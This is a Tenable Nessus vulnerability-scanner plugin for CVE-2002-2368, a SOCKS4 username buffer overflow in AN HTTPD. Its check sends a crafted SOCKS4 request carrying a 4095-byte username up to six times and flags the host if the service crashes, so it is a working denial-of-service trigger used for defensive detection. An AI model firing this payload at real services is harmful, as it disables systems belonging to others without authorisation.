#
# (C) Tenable Network Security, Inc.
# 

# References:
# Message-ID: <20021020163345.19911.qmail@securityfocus.com>
# Date: Mon, 21 Oct 2002 01:38:15 +0900
# From:"Kanatoko" <anvil@jumperz.net>
# To: bugtraq@securityfocus.com
# Subject: AN HTTPD SOCKS4 username Buffer Overflow Vulnerability
#
# Vulnerable:
# AN HTTPD
#

include("compat.inc");

if(description)
{
 script_id(11164);
 script_version ("$Revision: 1.11 $");

 script_cve_id("CVE-2002-2368");
 script_bugtraq_id(5147);
 script_xref(name:"OSVDB", value:"55662");

 script_name(english:"NEC SOCKS4 Module Username Handling Remote Overflow");
 
 script_set_attribute(
  attribute:"synopsis",
  value:"The remote SOCKS service is prone to a buffer overflow attack."
 );
 script_set_attribute(
  attribute:"description", 
  value:string(
   "The SOCKS4 service running on the remote host crashes when it receives\n",
   "a request with a long username.  An attacker may be able to leverage\n",
   "this issue to disable the remote service or even execute arbitrary\n",
   "code on the affected host."
  )
 );
 script_set_attribute(
  attribute:"solution", 
  value:"Contact the vendor for a fix."
 );
 script_set_attribute(
  attribute:"cvss_vector", 
  value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
 );
 script_end_attributes();

 script_summary(english:"Too long usernamename kills the SOCKS4A server");
 
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english:"Firewalls");
 script_require_ports("Services/socks4", 1080);
 script_dependencie("find_service1.nasl");
 exit(0);
}

########

include("global_settings.inc");
include("misc_func.inc");

if (report_paranoia < 2) exit(0);


port = get_kb_item("Services/socks4");
if(!port) port = 1080;
if(! get_port_state(port)) exit(0);

soc = open_sock_tcp(port);
if(! soc) exit(0);

nlen = 4095;
# Connect to 10.10.10.10 on port 8080 (= 31*256+4)
cnx = raw_string(4, 1, 4, 31, 10, 10, 10, 10) + crap(nlen) + raw_string(0);

for (i=0; i < 6; i=i+1)
{
 send(socket: soc, data: cnx);
 r = recv(socket: soc, length: 8, timeout:1);
 close(soc);
 soc = open_sock_tcp(port);
 if(! soc) { security_hole(port);  exit(0); }
}

close(soc);
